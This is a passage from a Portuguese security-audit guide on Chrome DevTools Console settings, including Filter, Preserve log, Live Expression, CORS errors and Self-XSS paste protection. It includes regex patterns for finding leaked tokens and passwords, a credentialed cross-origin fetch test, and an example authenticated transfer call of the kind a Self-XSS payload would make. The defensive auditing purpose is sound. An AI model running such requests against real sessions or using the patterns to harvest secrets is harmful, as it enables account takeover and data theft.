6. **Comportamento normal**: Em páginas simples sem iframes ou extensões ativas na página, apenas `top` (e eventualmente o *Service Worker* do site) aparece na lista. Quando o usuário seleciona um elemento dentro de um `<iframe>` na aba *Elements*, o Chrome altera automaticamente o seletor de contexto do Console para aquele iframe, destacando o botão em cor diferente para avisar que você não está mais em `top`.
7. **O que seria considerado seguro**: **`[REQUISITO]`** Quadros (`<iframe>`) que processam dados sensíveis de terceiros (como gateways de pagamento PCI-DSS — *Payment Card Industry Data Security Standard*) devem rodar em uma **origem separada** da página principal. Dessa forma, devido à **SOP (*Same-Origin Policy* — Política de Mesma Origem)**, um script rodando no contexto `top` **não consegue** acessar `iframe.contentWindow.document` programaticamente (embora o usuário humano no DevTools possa alternar o seletor manualmente para depuração).
8. **O que poderia indicar uma vulnerabilidade**:
   - **Falta de isolamento entre contextos**: se, estando no contexto `top`, um script da página principal conseguir ler dados sensíveis de um iframe via `window.frames[0].document` sem bloqueio de SOP, significa que ambos compartilham a mesma origem e que um eventual XSS na página principal comprometerá integralmente os dados do iframe.
   - **Comunicação insegura via `postMessage`**: contextos diferentes costumam se comunicar via `window.postMessage()`. Se o iframe ou o `top` não validarem `event.origin` ao receber mensagens, qualquer contexto malicioso poderá enviar comandos forjados.
9. **Como investigar o problema**: Clique no seletor **`top ▼`** e examine todos os contextos listados (iframes internos, iframes de terceiros, *workers*). Selecione cada iframe suspeito, digite `window.location.href` e `document.domain` no Console para identificar sua origem exata, e verifique se ele armazena dados sensíveis em `localStorage` ou `window`. Em seguida, volte para `top` e teste se `window.frames[0].document` é acessível ou se lança um `SecurityError` (comportamento seguro esperado entre origens distintas).
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Isole componentes críticos (pagamentos, autenticação federada, visualização de documentos enviados por usuários) em domínios/origens distintas, utilize o atributo `sandbox` restritivo em tags `<iframe>` (sem combinar `allow-scripts` e `allow-same-origin` quando o conteúdo não for confiável) e valide estritamente `event.origin` em todos os *listeners* de `message`.

##### Filter (busca por texto, regex, - exclusão, url:)

1. **Nome do parâmetro**: **Filter** (Caixa de filtragem de mensagens do Console).
2. **O que significa**: É um campo de pesquisa interativo que filtra em tempo real as mensagens exibidas no Console com base em strings literais, expressões regulares (*RegExp*), operadores de negação (`-`) e propriedades específicas da mensagem (como `url:`, `context:` ou `source:`).
3. **Para que serve**: Serve para localizar rapidamente informações específicas em meio a milhares de linhas de log (por exemplo, buscar por `token`, `Bearer`, `500` ou `CSP`) ou para silenciar mensagens repetitivas de arquivos de terceiros que atrapalham a análise.
4. **Onde encontrar no DevTools**: Na barra superior da aba **Console**, entre o seletor de contexto (`top`) e o seletor de níveis (`Default levels`), com o texto de espaço reservado (*placeholder*) **`Filter`**.
5. **Exemplo prático**:
   A caixa *Filter* aceita sintaxes avançadas extremamente úteis em auditorias:
   ```text
   # 1. Busca simples por texto (case-insensitive):
   password

   # 2. Exclusão com sinal de menos (-) para ocultar ruído de um script de analytics:
   -url:analytics.loja-ficticia.test -"[Violation]"

   # 3. Busca por Expressão Regular (delimitada por barras /.../):
   /(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+|Bearer\s+\S+|cpf|senha)/i

   # 4. Filtrar apenas mensagens originadas de um arquivo específico:
   url:auth-service.js
   ```
6. **Comportamento normal**: Quando vazia, todas as mensagens permitidas pelos níveis selecionados são exibidas. Quando preenchida, apenas as linhas cujo texto, arquivo de origem ou *stack trace* correspondem ao critério permanecem visíveis, e o botão *Levels* ao lado informa quantas mensagens foram ocultadas pelo filtro.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Ao aplicar uma expressão regular de caça a segredos (como `/eyJ[A-Za-z0-9_-]+|password|secret|api[_-]?key|token/i`) na caixa *Filter* após navegar por toda a aplicação com *Preserve log* e *Verbose* ativos, o resultado ideal e seguro é **nenhuma mensagem encontrada** em `User messages`.
8. **O que poderia indicar uma vulnerabilidade**: Encontrar correspondências na busca por padrões de JWT (`eyJ...`), chaves privadas, chaves de API (`AIza...`, `sk_live_...`), CPFs, números de cartão ou queries SQL ao filtrar o Console comprova o vazamento de dados sensíveis nos logs do cliente.
9. **Como investigar o problema**: Ative **Preserve log** e o nível **Verbose**, execute as operações principais do sistema (login, consulta de perfil, pagamento) e cole a expressão regular `/(eyJ[a-zA-Z0-9_-]{10,}|Bearer|password|senha|token|secret|apikey|cpf)/i` na caixa **Filter**. Analise cada linha resultante e clique no script de origem à direita.
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Remova logs de objetos completos de requisição/resposta no front-end e implemente funções utilitárias de mascaramento (*redaction*) caso algum log estruturado precise existir em ambientes de homologação. **Atenção**: lembre-se sempre de limpar a caixa *Filter* ao terminar uma busca específica para não acreditar erroneamente que o Console não está gerando novos erros.

##### Preserve log

1. **Nome do parâmetro**: **Preserve log** (Preservar registro entre navegações).
2. **O que significa**: Por padrão, toda vez que a página é recarregada (`F5`), redirecionada (`301`/`302` ou `window.location.href = ...`) ou navega para outro documento HTML, o Chrome limpa completamente a aba Console. Quando **Preserve log** está marcado, o histórico de mensagens é mantido continuamente através de múltiplos carregamentos e redirecionamentos de página.
3. **Para que serve**: Serve para capturar mensagens, erros, avisos de segurança e vazamentos de dados que ocorrem **imediatamente antes** de um redirecionamento ou submissão de formulário — momentos em que os logs apareceriam por apenas alguns milissegundos antes de serem apagados pela nova página.
4. **Onde encontrar no DevTools**: Na aba **Console**, clicando no ícone de **engrenagem (`⚙` Console settings)** no canto superior direito da barra do Console e marcando o checkbox **Preserve log** (também acessível em *Settings `F1` > Preferences > Console > Preserve log upon navigation*).
5. **Exemplo prático**:
   Em um fluxo de login tradicional ou OAuth 2.0 / OIDC (*OpenID Connect*):
   1. O usuário envia o formulário em `/login`.
   2. O script imprime `console.log("Token recebido:", token)` ou sofre um erro em `auth.js` e, na linha seguinte, executa `window.location.replace("/dashboard")`.
   3. Sem **Preserve log**, ao chegar em `/dashboard`, o Console está limpo e o auditor não vê o token que foi impresso em `/login`.
   4. Com **Preserve log** ativado, o Console insere uma linha divisória `Navigated to https://loja-ficticia.test/dashboard` e mantém intactos todos os logs e erros emitidos na página `/login` anterior.
6. **Comportamento normal**: Desmarcado por padrão ao abrir uma nova sessão do DevTools (a menos que tenha sido ativado anteriormente, pois o Chrome persiste essa preferência). Quando ativo, exibe mensagens de `Navigated to <URL>` a cada mudança de documento.
7. **O que seria considerado seguro**: **`[REQUISITO]`** Mesmo com *Preserve log* ativado durante todo o ciclo de autenticação, redirecionamento de SSO (*Single Sign-On* — autenticação única) e *logout*, nenhum token, credencial ou erro não tratado deve ser registrado nos passos intermediários de transição entre páginas.
8. **O que poderia indicar uma vulnerabilidade**: Páginas intermediárias de *callback* de autenticação (ex.: `/auth/callback?code=...`), páginas de processamento de pagamento ou scripts de guardiões de rota (*route guards* que verificam se o usuário é administrador antes de redirecioná-lo para `/acesso-negado`) frequentemente imprimem dados sensíveis ou lançam exceções reveladoras milissegundos antes de redirecionar o navegador.
9. **Como investigar o problema**: Antes de iniciar qualquer teste de autenticação, *logout*, recuperação de senha ou acesso forçado a URLs administrativas (ex.: acessar `/admin` sem estar logado), abra **Console settings (`⚙`)** e marque **Preserve log**. Execute a ação e role o Console para cima, analisando tudo o que ocorreu **acima** da linha `Navigated to ...`.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Nunca realize verificações de controle de acesso exclusivamente no cliente redirecionando via JavaScript após carregar os dados da página restrita, e certifique-se de que páginas de *callback* e transição não registrem parâmetros de URL ou tokens no Console.

##### Selected context only

1. **Nome do parâmetro**: **Selected context only** (Apenas o contexto selecionado).
2. **O que significa**: Por padrão, a área de mensagens do Console exibe os logs e erros de **todos** os contextos da página simultaneamente (a página principal `top`, todos os iframes, *workers* e extensões). Quando **Selected context only** está marcado, o Console exibe **exclusivamente** as mensagens originadas no contexto que estiver selecionado no menu suspenso *Execution context* (`top ▼`).
3. **Para que serve**: Serve para isolar a análise de logs quando a página contém iframes barulhentos (como widgets de anúncios, chats de suporte ou vídeos embutidos) ou quando extensões instaladas no navegador do próprio analista geram dezenas de erros que não pertencem à aplicação auditada.
4. **Onde encontrar no DevTools**: Clique no ícone de **engrenagem (`⚙` Console settings)** no canto superior direito da aba **Console** e marque o checkbox **Selected context only**.
5. **Exemplo prático**:
   Ao auditar `https://loja-ficticia.test`, uma extensão de bloqueio de anúncios e um iframe de chat de terceiros geram 40 erros no Console. O analista mantém o seletor de contexto em **`top`** e marca **Selected context only**: todos os erros da extensão e do iframe desaparecem, restando apenas os logs emitidos pelo próprio documento principal de `loja-ficticia.test`. Em seguida, muda o seletor de contexto para o iframe de pagamento para ver apenas os logs daquele iframe.
6. **Comportamento normal**: Desmarcado por padrão, permitindo visão global de todos os quadros e *workers* da aba.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Isolar o contexto ajuda o analista a atribuir corretamente a responsabilidade de um erro ou vazamento: saber se um `console.log(dadosUsuario)` veio do script próprio da empresa (`top`) ou de um iframe de terceiros embutido na página.
8. **O que poderia indicar uma vulnerabilidade**:
   - Se um script de terceiro ou iframe exibir logs com dados que só deveriam existir no contexto `top`, pode estar ocorrendo compartilhamento excessivo de dados com terceiros.
   - Inversamente, se o auditor deixar **Selected context only** marcado em `top` e esquecer disso, poderá **não ver** erros de XSS, violações de CSP ou vazamentos de tokens que estão acontecendo dentro de um `<iframe>` ou *Service Worker* da própria aplicação!
9. **Como investigar o problema**: Use **Selected context only** pontualmente quando precisar separar o que é emitido por `top` do que é emitido por um iframe específico ou *Service Worker*. Ao finalizar a análise isolada, desmarque a opção para recuperar a visão global de todos os contextos.
10. **Como corrigir ou prevenir**: **`[BOA PRÁTICA]`** Realize auditorias de segurança em um perfil limpo do navegador (ou janela anônima sem extensões ativas) para evitar que extensões poluam o Console, reduzindo a necessidade de manter *Selected context only* permanentemente ativo.

##### Group similar messages

1. **Nome do parâmetro**: **Group similar messages** (Agrupar mensagens semelhantes).
2. **O que significa**: É uma configuração que consolida mensagens idênticas ou estruturalmente semelhantes emitidas em sequência (por exemplo, dentro de um laço `for` ou em um evento `scroll`/`mousemove`) em uma única linha visual, exibindo um emblema numérico (*badge*) à esquerda com a contagem total de ocorrências (ex.: `(150)`).
3. **Para que serve**: Serve para evitar que um único aviso ou erro repetido centenas de vezes inunde a tela do Console e empurre outras mensagens importantes para fora da área visível.
4. **Onde encontrar no DevTools**: No menu **Console settings (`⚙`)** no canto superior direito da aba **Console**, através do checkbox **Group similar** (ou **Group similar messages in console** em *Settings `F1`*).
5. **Exemplo prático**:
   Um script executa uma verificação a cada 100ms que falha com `console.warn("Sessão prestes a expirar")`. Com **Group similar** marcado, o Console mostra apenas uma linha com um contador crescente `⚠️ (48) Sessão prestes a expirar` em vez de 48 linhas separadas.
6. **Comportamento normal**: Marcado (habilitado) por padrão no Chrome DevTools.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Manter o agrupamento ativo facilita a visualização panorâmica dos diferentes tipos de eventos que ocorrem na página sem perder o contexto geral.
8. **O que poderia indicar uma vulnerabilidade**:
   - Um contador de erros ou avisos subindo rapidamente para centenas ou milhares (ex.: `(2450) Uncaught RangeError` ou falhas de requisição em loop) pode indicar uma condição de negação de serviço no cliente (loop infinito, recursão descontrolada ou *polling* agressivo sem *backoff*).
   - Por outro lado, o agrupamento de mensagens semelhantes **pode ocultar variações sutis** entre mensagens que o Chrome considera "similares" (como múltiplos avisos de CSP ou depreciação em elementos diferentes).
9. **Como investigar o problema**: Se notar um contador alto ao lado de uma mensagem ou se suspeitar que variações importantes de avisos de segurança estão sendo colapsadas em uma única linha, abra **Console settings (`⚙`)** e **desmarque Group similar** temporariamente para inspecionar cada ocorrência individualmente em ordem cronológica exata.
10. **Como corrigir ou prevenir**: **`[BOA PRÁTICA]`** Evite colocar chamadas de log ou disparos de rede não controlados dentro de *listeners* de alta frequência (`scroll`, `mousemove`, `resize`, `input`) sem aplicar técnicas de *debounce* ou *throttle*, e implemente *exponential backoff* (recuo exponencial) em rotinas de reconexão quando uma API retorna erro.

##### Hide network messages

1. **Nome do parâmetro**: **Hide network messages** (Ocultar mensagens de rede).
2. **O que significa**: Por padrão, o navegador registra automaticamente um erro no Console sempre que uma requisição HTTP falha no nível de rede ou retorna um código de status de erro (`4xx` como `401`, `403`, `404`, `429` ou `5xx` como `500`, `502`, `503`). Marcar **Hide network messages** suprime essas mensagens automáticas da pilha de rede, mantendo no Console apenas as mensagens geradas por JavaScript e políticas de página.
3. **Para que serve**: Serve para limpar o Console quando o desenvolvedor está focado exclusivamente na depuração de lógica JavaScript/DOM e não quer ver dezenas de erros `404 (Not Found)` de imagens ausentes em ambiente de desenvolvimento.
4. **Onde encontrar no DevTools**: No painel **Console settings (`⚙`)** no canto superior direito da aba **Console**, marcando o checkbox **Hide network**.
5. **Exemplo prático**:
   Quando desmarcado (padrão), uma tentativa de acesso não autorizado a uma API gera automaticamente no Console:
   ```text
   ❌ GET https://api.loja-ficticia.test/v1/admin/relatorio-financeiro 403 (Forbidden)
   ```
   Quando **Hide network** é marcado, essa linha desaparece do Console (embora continue registrada na aba *Network*).
6. **Comportamento normal**: Desmarcado por padrão, de modo que falhas HTTP (`4xx`/`5xx`), bloqueios de extensões (`net::ERR_BLOCKED_BY_CLIENT`) e falhas de certificado TLS (`net::ERR_CERT_AUTHORITY_INVALID`) apareçam imediatamente como erros vermelhos no Console.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Em auditorias de segurança, esta opção deve permanecer **desmarcada** (ou seja, exibindo todas as mensagens de rede), pois os erros de rede no Console revelam instantaneamente chamadas ocultas em segundo plano que falharam por falta de permissão (`401`/`403`), erros internos do servidor (`500`) ou tentativas de conexão a domínios com certificados TLS inválidos.
8. **O que poderia indicar uma vulnerabilidade**:
   - Observar no Console requisições automáticas falhando com `403 Forbidden` ou `401 Unauthorized` para endpoints como `/api/internal/debug` ou `/admin/config` logo ao abrir a página pública revela a **existência de rotas administrativas ou de depuração ocultas** que o bundle front-end tentou consultar.
   - Erros como `net::ERR_CERT_DATE_INVALID` ou `net::ERR_SSL_PROTOCOL_ERROR` indicam falhas criptográficas na infraestrutura de subdomínios ou APIs consumidas pela aplicação.
9. **Como investigar o problema**: Certifique-se de que **Hide network** esteja **desmarcado** em `⚙ Console settings`. Quando um erro de rede aparecer no Console (ex.: `POST https://api.loja-ficticia.test/v1/checkout 500 (Internal Server Error)`), clique diretamente na URL exibida na mensagem do Console: o DevTools mudará automaticamente para a aba **Network** e selecionará exatamente aquela requisição para que você inspecione os cabeçalhos e o corpo da resposta.
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Não carregue nem dispare chamadas para endpoints administrativos em páginas destinadas a usuários comuns, corrija recursos quebrados (`404`) e problemas de certificados TLS, e trate códigos HTTP de erro adequadamente no cliente.

##### Live Expression

1. **Nome do parâmetro**: **Live Expression** (Expressão ao vivo — ícone de olho `👁`).
2. **O que significa**: É um recurso do Console que permite fixar (*pin*) uma ou mais expressões JavaScript no topo da aba Console para que sejam **avaliadas continuamente em tempo real** (em alta frequência, várias vezes por segundo), atualizando o valor exibido sem que o desenvolvedor precise digitar a expressão repetidamente no prompt.
3. **Para que serve**: Serve para monitorar dinamicamente o valor de variáveis globais, propriedades do DOM (`document.activeElement`), estado de autenticação no armazenamento (`localStorage.getItem('token')`), coordenadas ou timers enquanto o usuário interage normalmente com a página.
4. **Onde encontrar no DevTools**: Na barra superior da aba **Console**, clicando no botão com **ícone de olho (`👁` Create live expression)** localizado ao lado do botão *Clear console*. Uma faixa de edição se abre logo abaixo da barra de ferramentas; digite a expressão e pressione `Enter` (ou clique fora) para fixá-la.
5. **Exemplo prático**:
   Durante uma auditoria de gestão de sessão e foco de elementos, você clica no ícone **`👁`** três vezes para fixar três expressões ao vivo no topo do Console:
   ```javascript
   // Live Expression 1: Monitorar quem detém o foco no DOM em tempo real
   document.activeElement

   // Live Expression 2: Monitorar o token salvo no Local Storage durante login/refresh/logout
   localStorage.getItem("access_token")

   // Live Expression 3: Monitorar os cookies acessíveis via JS
   document.cookie
   ```
   Conforme você faz login, navega pela aplicação e clica em **Sair (Logout)**, você assiste em tempo real se `localStorage.getItem("access_token")` e `document.cookie` passam imediatamente para `null` / `""` ou se continuam preenchidos indevidamente após o logout!
6. **Comportamento normal**: Quando nenhuma expressão ao vivo está criada, a barra de *Live Expressions* fica oculta. Quando criada, permanece fixada no topo do Console (mesmo ao limpar os logs com *Clear console*) até ser removida clicando no `X` ao lado da expressão.
7. **O que seria considerado seguro**: **`[REQUISITO]`** Ao monitorar `localStorage`, `sessionStorage`, `document.cookie` e variáveis globais de estado (ex.: `window.__INITIAL_STATE__`) com *Live Expressions*:
   - Cookies de sessão **não** devem aparecer em `document.cookie` (pois devem possuir a flag `HttpOnly`).
   - Ao acionar o *Logout*, qualquer estado em memória ou armazenamento local deve ser limpo instantaneamente.
8. **O que poderia indicar uma vulnerabilidade**:
   - Ver o token de sessão surgir em `document.cookie` ou `localStorage` na *Live Expression* comprova que o identificador de sessão está exposto à leitura por scripts (vulnerável a roubo via XSS).
   - Ver que, após clicar em "Sair", o usuário é redirecionado para a tela de login, mas a *Live Expression* mostra que `localStorage.getItem("access_token")` continua contendo o JWT intacto (falha de limpeza de sessão no cliente).
9. **Como investigar o problema**: Clique no ícone **`👁` (Create live expression)**, digite a expressão que referencia o dado sensível ou estado de permissão (ex.: `window.appState?.user?.role` ou `localStorage.getItem('jwt')`), pressione `Enter` e execute os fluxos de transição de privilégio e encerramento de sessão na interface da aplicação.
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Armazene identificadores de sessão em cookies com `HttpOnly; Secure; SameSite=Lax` (ou `Strict`), invisíveis para `document.cookie`, e no evento de logout invalide a sessão no servidor, envie o cabeçalho `Clear-Site-Data: "cache", "cookies", "storage"` e limpe explicitamente o estado em memória da aplicação.

##### Log XMLHttpRequests

1. **Nome do parâmetro**: **Log XMLHttpRequests** (Registrar requisições XMLHttpRequest e Fetch no Console).
2. **O que significa**: É uma opção das configurações do Console que, quando ativada, imprime uma mensagem informativa no Console para **toda** requisição assíncrona concluída pela página via APIs `XMLHttpRequest` (XHR — *XMLHttpRequest*) ou `fetch()`, mesmo aquelas bem-sucedidas com status `200 OK` (que normalmente não aparecem no Console).
3. **Para que serve**: Serve para correlacionar cronologicamente o momento exato em que cada chamada de API (`Fetch finished loading: GET "..."` ou `XHR finished loading: POST "..."`) aconteceu em relação aos logs JavaScript e interações de interface registrados no Console.
4. **Onde encontrar no DevTools**: Clique no ícone de **engrenagem (`⚙` Console settings)** no canto superior direito da aba **Console** e marque o checkbox **Log XMLHttpRequests**.
5. **Exemplo prático**:
   Com **Log XMLHttpRequests** ativado, ao clicar no botão "Finalizar Compra", o Console exibe a sequência exata de eventos intercalando logs de código e chamadas de rede:
   ```text
   [Checkout] Iniciando validação do endereço...                                 checkout.js:31
   Fetch finished loading: GET "https://api.loja-ficticia.test/v1/frete?cep=01001000".  checkout.js:45
   [Checkout] Frete calculado. Enviando pedido...                                checkout.js:60
   XHR finished loading: POST "https://api.loja-ficticia.test/v1/pedidos".       vendor.js:812
   ```
6. **Comportamento normal**: Desmarcado por padrão (para evitar que aplicações com muitas requisições preencham o Console com dezenas de linhas `Fetch finished loading`).
7. **O que seria considerado seguro**: **`[REQUISITO]`** Todas as URLs exibidas nas linhas `Fetch/XHR finished loading` devem utilizar o esquema `https://`, apontar apenas para domínios conhecidos e autorizados pela arquitetura da aplicação e não trafegar credenciais ou dados pessoais sensíveis na *query string* da URL.
8. **O que poderia indicar uma vulnerabilidade**:
   - **Detecção de exfiltração de dados ou beacons ocultos**: ao ativar **Log XMLHttpRequests** e digitar em campos de formulário (como senha ou cartão de crédito), se você observar disparos imediatos de `Fetch finished loading: POST "https://coletor-externo.test/log"` a cada tecla pressionada, há um forte indício de *keylogger* JavaScript ou ataque de *Formjacking* / *Magecart* (comprometimento de cadeia de suprimentos em scripts de terceiros).
   - **Condições de corrida (*Race Conditions*) de front-end**: ver múltiplas chamadas `POST` idênticas sendo disparadas em paralelo ou fora de ordem antes da validação terminar.
9. **Como investigar o problema**: Abra **Console settings (`⚙`)**, marque **Log XMLHttpRequests** e garanta que o nível **Info** esteja ativo. Interaja com formulários sensíveis da página e observe cada linha `Fetch/XHR finished loading`. Expanda a seta `▶` à esquerda da mensagem para ver a pilha completa de funções JavaScript (*stack trace*) que disparou aquela requisição, ou clique no link da URL para abrir os detalhes na aba *Network*.
10. **Como corrigir ou prevenir**: **`[RECOMENDAÇÃO]`** Audite periodicamente todas as dependências de terceiros, utilize **SRI (*Subresource Integrity* — Integridade de Sub-recurso)** em tags `<script>` externas e restrinja os domínios para os quais o navegador pode enviar requisições por meio da diretiva `connect-src` do cabeçalho **Content-Security-Policy (CSP)** (veja a [Seção 5.1](./05-headers-de-seguranca.md#s5-1)).

##### Show CORS errors in console

1. **Nome do parâmetro**: **Show CORS errors in console** (Exibir erros de CORS no Console).
2. **O que significa**: É o controle que determina se falhas na política de **CORS (*Cross-Origin Resource Sharing*)** devem ser exibidas detalhadamente como mensagens de erro vermelhas na aba Console (além de serem registradas na aba *Issues* e na aba *Network*).
3. **Para que serve**: Serve para alertar imediatamente quando o navegador bloqueia a leitura de uma resposta vinda de outra origem (ou aborta uma requisição *preflight* `OPTIONS`) porque o servidor de destino não incluiu os cabeçalhos `Access-Control-Allow-*` exigidos pela *Same-Origin Policy*.
4. **Onde encontrar no DevTools**: No menu **Console settings (`⚙`)** no canto superior direito da aba **Console**, através do checkbox **Show CORS errors in console**.
5. **Exemplo prático**:
   Quando marcado (padrão), se o front-end em `https://loja-ficticia.test` tentar ler dados de `https://api-parceiro.test/dados` sem permissão CORS, o Console exibe:
   ```text
   ❌ Access to fetch at 'https://api-parceiro.test/dados' from origin 'https://loja-ficticia.test' has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource. If an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with CORS disabled.
   ```
6. **Comportamento normal**: Marcado por padrão. Sempre que um bloqueio de CORS ocorre, o Console mostra a explicação exata do motivo do bloqueio (ausência de `Access-Control-Allow-Origin`, origem incompatível, falta de `Access-Control-Allow-Credentials: true` ou método/cabeçalho não permitido no *preflight*).
7. **O que seria considerado seguro**: **`[REQUISITO]`** O bloqueio de CORS exibido pelo navegador **é um mecanismo de defesa funcionando corretamente** para proteger o usuário contra leituras cross-origin não autorizadas. Em uma configuração segura, o servidor só emite `Access-Control-Allow-Origin` para origens explicitamente confiáveis pertencentes a uma lista de permissão (*allowlist*) estrita.
8. **O que poderia indicar uma vulnerabilidade**:
   - O perigo real frequentemente nasce da **tentativa apressada de "consertar" o erro de CORS visto no Console**: desenvolvedores inexperientes copiam soluções inseguras da internet e configuram o servidor para devolver `Access-Control-Allow-Origin: *` ou para refletir cegamente qualquer cabeçalho `Origin` enviado pelo cliente junto com `Access-Control-Allow-Credentials: true` (veja as [Seções 1.11.3](./01b-fundamentos-web-parte2.md#s1-11-3), [5.10](./05-headers-de-seguranca.md#s5-10) e [5.11](./05-headers-de-seguranca.md#s5-11)).
   - Se este checkbox estiver desmarcado no DevTools, o desenvolvedor ou auditor pode não perceber falhas de integração ou tentativas de scripts maliciosos de ler endpoints de outras origens.
9. **Como investigar o problema**: Mantenha **Show CORS errors in console** marcado. Ao observar um erro de CORS no Console, leia o motivo específico na mensagem ou clique no botão de link para a aba **Issues** / **Network** para inspecionar tanto a requisição `OPTIONS` (*preflight*) quanto a requisição principal. Para testar se o servidor possui um CORS permissivo demais, execute no próprio Console um `fetch('https://api.loja-ficticia.test/v1/perfil', { credentials: 'include' })` a partir de uma aba aberta em outra origem de teste (como `https://exemplo.test`) e verifique se o navegador bloqueia a leitura (seguro) ou permite ler os dados (vulnerável!).
10. **Como corrigir ou prevenir**: **`[REQUISITO]`** Configure o CORS no servidor validando o cabeçalho `Origin` contra uma lista fechada de domínios confiáveis exatos, adicione o cabeçalho `Vary: Origin` e jamais reflita origens arbitrárias quando `Access-Control-Allow-Credentials: true` estiver habilitado.

##### Eager evaluation

1. **Nome do parâmetro**: **Eager evaluation** (Avaliação antecipada no prompt do Console).
2. **O que significa**: É um recurso inteligente do REPL do Console que avalia a expressão JavaScript **enquanto você ainda está digitando** (antes mesmo de pressionar `Enter`) e exibe uma prévia esmaecida do valor de retorno logo abaixo do cursor, **desde que** o motor V8 determine que a expressão é livre de efeitos colaterais (*side-effect free* — ou seja, não modifica variáveis, não altera o DOM e não dispara requisições de rede).
3. **Para que serve**: Serve para acelerar a inspeção e depuração interativa, permitindo ver instantaneamente o resultado de seletores (`document.querySelectorAll('input')`), cálculos, expressões regulares ou propriedades de objetos antes de confirmar a execução do comando.
4. **Onde encontrar no DevTools**: No menu **Console settings (`⚙`)** no canto superior direito da aba **Console**, através do checkbox **Eager evaluation** (ou em *Settings `F1` > Preferences > Console > Eagerly evaluate Console prompt text*).
5. **Exemplo prático**:
   Ao digitar no prompt `>` do Console (sem apertar `Enter`):
   ```javascript
   > document.forms[0].elements.length
     4   // <-- Prévia exibida instantaneamente em cinza claro pelo Eager evaluation!
   ```
   Se você digitar uma expressão que causa efeito colateral, como `document.body.innerHTML = ""` ou `fetch('/api/delete')`, o Chrome **não** executa a prévia antecipada para evitar destruir o estado da página acidentalmente enquanto você digita.
6. **Comportamento normal**: Habilitado por padrão no Chrome DevTools.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** A avaliação antecipada é segura por design porque o motor V8 aborta a pré-execução assim que detecta qualquer instrução que causaria mutação de estado (*side effect*).
8. **O que poderia indicar uma vulnerabilidade**: Embora o *Eager evaluation* em si não seja uma vulnerabilidade, durante uma auditoria ele permite explorar rapidamente objetos globais no namespace `window` (digitando `window.` e navegando pelas sugestões de autocompletar com *Eager evaluation* ativo) para descobrir propriedades internas como `window.__CONFIG__`, `window.env` ou `window.currentUser` que expõem segredos ou flags de administração.
9. **Como investigar o problema**: Com **Eager evaluation** e **Autocomplete from history** ativos em `⚙ Console settings`, digite no prompt expressões de inspeção de leitura como `Object.keys(localStorage)`, `document.cookie.split(';')` ou `window.__` e observe a prévia imediata dos valores retornados.
10. **Como corrigir ou prevenir**: **`[BOA PRÁTICA]`** Evite poluir o escopo global (`window`) com variáveis de configuração interna, chaves de serviços ou objetos de sessão; encapsule o estado da aplicação dentro de módulos ES (*ECMAScript Modules*) ou *closures* inacessíveis diretamente pelo escopo global.

##### Proteção contra Self-XSS ("allow pasting")

1. **Nome do parâmetro**: **Self-XSS Protection / `"allow pasting"`** (Proteção nativa do DevTools contra ataques de Auto-XSS).
2. **O que significa**: **Self-XSS (*Self Cross-Site Scripting*)** é um ataque de engenharia social em que um criminoso convence a própria vítima a abrir o Console do DevTools (`F12`) e colar (`Ctrl + V`) um trecho de código JavaScript malicioso sob um pretexto falso (ex.: *"Cole este código no Console para ganhar moedas grátis, desbloquear um recurso oculto ou verificar quem visitou seu perfil"*). Para mitigar esse golpe, o Chrome DevTools bloqueia por padrão a colagem de código no Console para usuários que não costumam usar a ferramenta, exigindo a digitação manual de uma frase de confirmação (**`allow pasting`** ou o equivalente localizado do navegador, como `permitir colar` — `**[Varia por versão]**`).
3. **Para que serve**: Serve como uma barreira de segurança crítica para impedir que usuários leigos executem payloads maliciosos contra suas próprias sessões autenticadas no navegador (o que daria ao script colado acesso total à conta da vítima naquela origem).
4. **Onde encontrar no DevTools**: Aparece automaticamente como um aviso destacado com ícone `⚠️` no prompt da aba **Console** (e também no editor da aba *Sources*) na primeira vez que um perfil novo do Chrome tenta colar (`Ctrl + V` ou *Paste*) texto copiado de outra fonte no Console.
5. **Exemplo prático**:
   Ao tentar colar um snippet no Console em um perfil recém-criado, a colagem é bloqueada e o Chrome exibe:
   ```text
   ⚠️ Warning: Don't paste code into the DevTools Console that you don't understand or haven't reviewed yourself. This could allow attackers to steal your identity or take control of your computer. Please type 'allow pasting' below and press Enter to allow pasting.
   ```
   Somente após o usuário digitar manualmente `allow pasting` no teclado e pressionar `Enter` o bloqueio é desativado naquele perfil. Além disso, grandes plataformas web (como redes sociais e bancos) também imprimem no Console um grande aviso em letras vermelhas usando estilização CSS no `console.log("%cPARE!", "color: red; font-size: 40px; font-weight: bold;")` alertando sobre golpes de Self-XSS.
6. **Comportamento normal**: O bloqueio atua nas primeiras interações de colagem em um perfil de navegador que ainda não confirmou `allow pasting`. Uma vez confirmado pelo desenvolvedor, a colagem passa a funcionar normalmente nas sessões seguintes daquele perfil.
7. **O que seria considerado seguro**: **`[BOA PRÁTICA]`** Nunca colar no Console códigos ofuscados (ex.: `eval(atob('...'))`, arrays hexadecimais `_0x4a2b` ou URLs `import('https://...')`) copiados de fóruns, vídeos ou mensagens de terceiros enquanto estiver em uma aba autenticada de uma aplicação real. Em aplicações com milhões de usuários finais (redes sociais, jogos web, carteiras digitais, e-commerce), é uma excelente prática de defesa em profundidade exibir também um banner educativo de aviso no Console ao carregar a página.
8. **O que poderia indicar uma vulnerabilidade**:
   - Se um usuário for induzido a digitar `allow pasting` e colar um payload no Console, esse código roda com **exatamente os mesmos privilégios da própria aplicação**: ele pode ler todo o `localStorage`/`sessionStorage`, ler cookies sem `HttpOnly`, modificar o DOM e disparar requisições `fetch('/api/transferir', { credentials: 'include' })` autenticadas em nome da vítima!
   - Embora o Self-XSS exija engenharia social, se a aplicação armazena tokens de longa duração em `localStorage` ou permite ações críticas (como troca de e-mail/senha ou transferência de valores) sem exigir **reautenticação / segundo fator (MFA — *Multi-Factor Authentication*)**, o impacto de um Self-XSS (ou de qualquer XSS comum) torna-se devastador e persistente.
